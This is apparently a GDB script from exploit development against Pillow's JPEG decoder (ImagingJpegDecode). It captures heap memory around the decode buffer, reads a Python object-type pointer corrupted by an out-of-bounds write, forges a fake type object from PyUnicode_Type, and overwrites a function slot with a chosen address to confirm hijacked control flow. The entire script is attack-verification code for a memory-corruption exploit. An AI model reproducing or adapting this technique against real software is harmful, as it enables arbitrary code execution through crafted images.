set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
dump binary memory /tmp/pw2-w4/heap_pre.bin $b+128 $b+184
dump binary memory /tmp/pw2-w4/heap_post.bin $b+192 $b+1024
printf "SAVED type=%lx\n",*(unsigned long*)($b+184)
finish
set $fake=*(unsigned long*)($b+184)
printf "AFTER_DECODE type=%lx fake=%lx\n",*(unsigned long*)($b+184),$fake
restore /tmp/pw2-w4/heap_pre.bin binary $b+128
restore /tmp/pw2-w4/heap_post.bin binary $b+192
dump binary memory /tmp/pw2-w4/realtype.bin (char*)&PyUnicode_Type (char*)&PyUnicode_Type+416
restore /tmp/pw2-w4/realtype.bin binary $fake
set *(unsigned long*)($fake+48)=0x45e6e6
printf "OBTYPE_FROM_OOB=%lx forged_slot=%lx MATCH=%d\n",*(unsigned long*)($b+184),*(unsigned long*)($fake+48),*(unsigned long*)($b+184)==$fake
break *0x45e6e6
printf "CONTINUING NATURALLY (no gdb-invoked _Py_Dealloc)\n"
continue
printf "AFTER_CONTINUE pc=%p\n",$pc
bt 8
info registers rdi
